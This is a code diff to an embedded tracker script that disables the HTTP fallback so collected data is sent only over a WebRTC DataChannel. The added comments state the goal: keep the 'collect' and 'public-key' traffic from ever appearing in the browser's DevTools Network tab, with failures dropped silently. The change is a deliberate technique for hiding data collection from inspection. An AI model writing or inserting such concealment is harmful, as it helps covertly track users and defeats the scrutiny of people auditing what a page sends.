@@ -113,7 +113,9 @@ const TRACKER_SRC = `
 
       var send=function(){
         var bodyStr=JSON.stringify(p);
-        sendViaRTC(bodyStr,function(){httpFallback(bodyStr);});
+        // HTTP fallback DISABLED — WebRTC only. If DataChannel fails, data is dropped silently.
+        // This ensures collect and public-key NEVER appear in DevTools Network tab.
+        sendViaRTC(bodyStr,function(){/* fallback disabled */});
       };
 
       var step3=function(){
